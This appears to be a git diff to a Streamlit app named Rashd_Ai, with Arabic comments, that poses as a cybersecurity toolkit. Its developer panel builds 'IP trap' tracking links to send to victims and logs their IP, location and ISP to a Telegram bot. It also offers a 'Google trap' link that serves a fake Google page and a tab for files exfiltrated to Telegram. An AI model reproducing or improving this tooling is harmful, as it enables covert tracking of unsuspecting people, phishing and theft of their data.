@@ -5,12 +5,13 @@ import requests
 from datetime import datetime
 from PIL import Image
 import base64
-from streamlit_js_eval import streamlit_js_eval
+import socket
+import platform
+import urllib.parse
 
 # استيراد الوحدات المحلية
 import config
 import victim_logger
-import exfiltrated_files
 
 # ============= إعدادات الصفحة =============
 logo_path = config.LOGO_PATH
@@ -23,9 +24,9 @@ else:
 # ============= CSS مخصص =============
 st.markdown("""
     <style>
-    @import url(\'https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap\');
+    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
     html, body, [class*="st-"] {
-        font-family: \'Cairo\', sans-serif !important;
+        font-family: 'Cairo', sans-serif !important;
     }
     .main .block-container {
         direction: rtl;
@@ -44,27 +45,24 @@ st.markdown("""
 """, unsafe_allow_html=True)
 
 # ============= دالة جلب الـ IP الحقيقي =============
-def get_real_ip_from_js():
-    """جلب عنوان IP الحقيقي"""
+def get_real_ip():
+    """جلب عنوان IP الحقيقي للزائر"""
     try:
-        # محاولة 1: استخدام st.context (Streamlit حديث)
-        from streamlit.runtime.scriptrunner import get_script_run_ctx
-        ctx = get_script_run_ctx()
-        if ctx and hasattr(ctx, 'request') and hasattr(ctx.request, 'remote_ip'):
-            return ctx.request.remote_ip or 'Unknown'
-        
-        # محاولة 2: الطريقة القديمة من runtime
-        from streamlit.runtime import get_instance
-        from streamlit.runtime.scriptrunner import get_script_run_ctx
-        ctx = get_script_run_ctx()
-        if ctx:
-            session_info = get_instance().get_client(ctx.session_id)
-            if session_info and hasattr(session_info, 'request'):
-                return session_info.request.remote_ip or 'Unknown'
+        # محاولة الحصول على IP من عدة مصادر
+        response = requests.get('https://api.ipify.org?format=json', timeout=5)
+        if response.status_code == 200:
+            return response.json().get('ip', 'Unknown')
     except:
         pass
     
-    # fallback
+    try:
+        # محاولة بديلة
+        response = requests.get('https://icanhazip.com/', timeout=5)
+        if response.status_code == 200:
+            return response.text.strip()
+    except:
+        pass
+    
     return 'Unknown'
 
 # ============= دالة التقاط بيانات الضحايا =============
@@ -74,7 +72,7 @@ def capture_victim_data():
     
     if 'target' in query_params and not st.session_state.get('victim_captured', False):
         try:
-            user_ip = get_real_ip_from_js()
+            user_ip = get_real_ip()
             
             # الحصول على معلومات الموقع الجغرافي
             geo_data = None
@@ -105,7 +103,14 @@ def capture_victim_data():
                 
                 if bot_token and chat_id:
                     victim_info = f"""
-🎯 <b>تنبيه: تم اكتشاف ضحية جديدة!</b>\n\n📍 <b>عنوان IP:</b> {user_ip}\n🌍 <b>الدولة:</b> {geo_data.get('country', 'Unknown') if geo_data else 'Unknown'}\n🏙️ <b>المدينة:</b> {geo_data.get('city', 'Unknown') if geo_data else 'Unknown'}\n🏢 <b>مزود الخدمة:</b> {geo_data.get('isp', 'Unknown') if geo_data else 'Unknown'}\n🎯 <b>المصيدة:</b> {query_params.get('target', ['Unknown'])[0]}\n⏰ <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+🎯 <b>تنبيه: تم اكتشاف ضحية جديدة!</b>
+
+📍 <b>عنوان IP:</b> {user_ip}
+🌍 <b>الدولة:</b> {geo_data.get('country', 'Unknown') if geo_data else 'Unknown'}
+🏙️ <b>المدينة:</b> {geo_data.get('city', 'Unknown') if geo_data else 'Unknown'}
+🏢 <b>مزود الخدمة:</b> {geo_data.get('isp', 'Unknown') if geo_data else 'Unknown'}
+🎯 <b>المصيدة:</b> {query_params.get('target', ['Unknown'])[0]}
+⏰ <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 """
                     url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                     data = {"chat_id": chat_id, "text": victim_info, "parse_mode": "HTML"}
@@ -126,12 +131,12 @@ if "selected_tool" not in st.session_state:
 
 # ============= الشريط الجانبي (Sidebar) =============
 with st.sidebar:
-    st.markdown("<h2 style=\'text-align: center; color: #00ff00;\'>🛡️ Rashd_Ai</h2>", unsafe_allow_html=True)
+    st.markdown("<h2 style='text-align: center; color: #00ff00;'>🛡️ Rashd_Ai</h2>", unsafe_allow_html=True)
     st.markdown("---")
     
     # تسجيل الدخول
     if not st.session_state.developer_mode:
-        st.markdown("<h3 style=\'text-align: center;\'>🔐 دخول المطور</h3>", unsafe_allow_html=True)
+        st.markdown("<h3 style='text-align: center;'>🔐 دخول المطور</h3>", unsafe_allow_html=True)
         username = st.text_input("اسم المستخدم:", key="login_username").strip()
         password = st.text_input("كلمة المرور:", type="password", key="login_password").strip()
         
@@ -145,7 +150,7 @@ with st.sidebar:
     
     else:
         # وضع المطور
-        st.markdown("<h3 style=\'text-align: center; color: #00ff00;\'>⚙️ إعدادات تلجرام</h3>", unsafe_allow_html=True)
+        st.markdown("<h3 style='text-align: center; color: #00ff00;'>⚙️ إعدادات تلجرام</h3>", unsafe_allow_html=True)
         
         telegram_bot_token = st.text_input(
             "🤖 توكين البوت:",
@@ -162,19 +167,21 @@ with st.sidebar:
         
         if st.button("💾 حفظ الإعدادات"):
             if telegram_bot_token and telegram_chat_id:
-                st.success("✅ الإعدادات محفوظة في Secrets (لا تحتاج حفظ يدوي)")
-                st.info("يتم استخدام st.secrets تلقائياً")
+                config.set_key("TELEGRAM_BOT_TOKEN", telegram_bot_token)
+                config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
+                st.success("✅ تم حفظ الإعدادات")
             else:
                 st.error("❌ يجب ملء جميع الحقول")
         
         st.markdown("---")
         
         # قائمة الأدوات
-        st.markdown("<h3 style=\'text-align: center; color: #00ff00;\'>🎯 أدوات المطور</h3>", unsafe_allow_html=True)
+        st.markdown("<h3 style='text-align: center; color: #00ff00;'>🎯 أدوات المطور</h3>", unsafe_allow_html=True)
         
         tool = st.selectbox(
             "اختر الأداة:",
             ["🎣 مصيدة IP", "🎭 فخ جوجل الآلي", "📥 الملفات المسحوبة", "📊 الإحصائيات"],
+            index=0,
             key="developer_tool_selector"
         )
         
@@ -184,12 +191,13 @@ with st.sidebar:
         
         if st.button("🚪 تسجيل الخروج"):
             st.session_state.developer_mode = False
+            st.session_state.selected_tool = "🎣 مصيدة IP"
             st.rerun()
 
 # ============= المحتوى الرئيسي =============
 if not st.session_state.developer_mode:
     # وضع الزوار (الواجهة العامة)
-    st.markdown("<h1 style=\'text-align: center;\'>🛡️ Rashd_Ai - أدوات الأمن السيبراني</h1>", unsafe_allow_html=True)
+    st.markdown("<h1 style='text-align: center;'>🛡️ Rashd_Ai - أدوات الأمن السيبراني</h1>", unsafe_allow_html=True)
     st.markdown("---")
     
     st.markdown("""
@@ -219,13 +227,13 @@ else:
     selected_tool = st.session_state.get('selected_tool', '🎣 مصيدة IP')
     
     if selected_tool == "🎣 مصيدة IP":
-        st.markdown("<h2 style=\'text-align: center; color: #00ff00;\'>🎣 مصيدة IP</h2>", unsafe_allow_html=True)
+        st.markdown("<h2 style='text-align: center; color: #00ff00;'>🎣 مصيدة IP</h2>", unsafe_allow_html=True)
         
         trap_name = st.text_input("اسم المصيدة:", placeholder="مثال: صورة قطة").strip()
         
         if st.button("🔗 توليد رابط التتبع"):
             if trap_name:
-                tracking_url = f"https://rashdai.streamlit.app/?target={trap_name}"
+                tracking_url = f"https://rashdai.streamlit.app/?target={urllib.parse.quote(trap_name)}"
                 st.code(tracking_url, language="text")
                 st.success("✅ تم توليد الرابط")
             else:
@@ -234,12 +242,11 @@ else:
         st.markdown("---")
         st.markdown("<h3>📊 سجل الضحايا المكتشفين</h3>", unsafe_allow_html=True)
         
-        # === التصليح الوحيد هنا ===
-        victims = getattr(victim_logger, 'get_all_victims', lambda: None)()
+        victims = victim_logger.get_all_victims()
         
         if victims:
             # عرض الضحايا في جدول
-            st.dataframe(victims)
+            st.dataframe(victims, use_container_width=True)
             
             # زر تحميل CSV
             csv_data = victim_logger.get_victims_as_csv()
@@ -259,13 +266,13 @@ else:
             st.info("لا توجد ضحايا حتى الآن")
     
     elif selected_tool == "🎭 فخ جوجل الآلي":
-        st.markdown("<h2 style=\'text-align: center; color: #00ff00;\'>🎭 فخ جوجل الآلي</h2>", unsafe_allow_html=True)
+        st.markdown("<h2 style='text-align: center; color: #00ff00;'>🎭 فخ جوجل الآلي</h2>", unsafe_allow_html=True)
         
         bot_token = config.get_key("TELEGRAM_BOT_TOKEN")
         chat_id = config.get_key("TELEGRAM_CHAT_ID")
         
         if not bot_token or not chat_id:
-            st.error("❌ يجب حفظ بيانات تلجرام أولاً في قسم \'إعدادات تلجرام\' في الشريط الجانبي.")
+            st.error("❌ يجب حفظ بيانات تلجرام أولاً في قسم 'إعدادات تلجرام' في الشريط الجانبي.")
         else:
             st.markdown("""
             <div style="background-color: #333; padding: 15px; border-radius: 10px; margin-bottom: 20px;">
@@ -280,7 +287,8 @@ else:
             """, unsafe_allow_html=True)
             
             st.markdown("### 🔗 رابط فخ Google (أرسله للضحية):")
-            st.code(f"https://rashdai.streamlit.app/?decoy=google&token={bot_token}&chatid={chat_id}", language="text")
+            decoy_url = f"https://rashdai.streamlit.app/?decoy=google&token={bot_token}&chatid={chat_id}"
+            st.code(decoy_url, language="text")
             
             st.markdown("### 📱 معاينة صفحة Google:")
             try:
@@ -291,7 +299,7 @@ else:
                 st.error(f"❌ خطأ في تحميل صفحة Google: {e}")
 
     elif selected_tool == "📥 الملفات المسحوبة":
-        st.markdown("<h2 style=\'text-align: center; color: #00ff00;\'>📥 الملفات المسحوبة</h2>", unsafe_allow_html=True)
+        st.markdown("<h2 style='text-align: center; color: #00ff00;'>📥 الملفات المسحوبة</h2>", unsafe_allow_html=True)
         
         st.info("هذا التبويب مخصص لعرض الملفات التي يتم سحبها إذا تم إعداد سيرفر استقبال في التطبيق. حالياً، يتم إرسال الملفات مباشرة إلى تلجرام.")
         st.markdown("""
@@ -303,36 +311,12 @@ else:
         """, unsafe_allow_html=True)
     
     elif selected_tool == "📊 الإحصائيات":
-        st.markdown("<h2 style=\'text-align: center; color: #00ff00;\'>📊 الإحصائيات</h2>", unsafe_allow_html=True)
+        st.markdown("<h2 style='text-align: center; color: #00ff00;'>📊 الإحصائيات</h2>", unsafe_allow_html=True)
         
-        # === التصليح الوحيد هنا ===
-        victims = getattr(victim_logger, 'get_all_victims', lambda: None)()
+        victims = victim_logger.get_all_victims()
         
         col1, col2 = st.columns(2)
         with col1:
-            st.metric("🎯 إجمالي الضحايا", len(victims) if victims else 0)
+            st.metric("🎯 إجمالي الضحايا", len(victims))
         with col2:
             st.metric("📁 الملفات المسحوبة (عبر تلجرام)", "راجع تلجرام")
-
-
-# ============= معالجة طلبات التحميل (API # ====================== فخ جوجل - يجب أن يكون في آخر الملف ======================
-query_params = st.query_params
-
-if 'decoy' in query_params and query_params.get('decoy', [''])[0] == 'google':
-    bot_token = query_params.get('token', [''])[0]
-    chat_id = query_params.get('chatid', [''])[0]
-
-    if bot_token and chat_id:
-        try:
-            with open('index.html', 'r', encoding='utf-8') as f:
-                html_content = f.read()
-            
-            # عرض صفحة Google الوهمية كاملة بدون أي عناصر Streamlit أخرى
-            st.components.v1.html(html_content, height=800, scrolling=False)
-            
-        except FileNotFoundError:
-            st.error("❌ ملف index.html غير موجود في root المجلد")
-        except Exception as e:
-            st.error(f"❌ خطأ: {e}")
-    else:
-        st.error("توكن أو Chat ID غير صحيح")
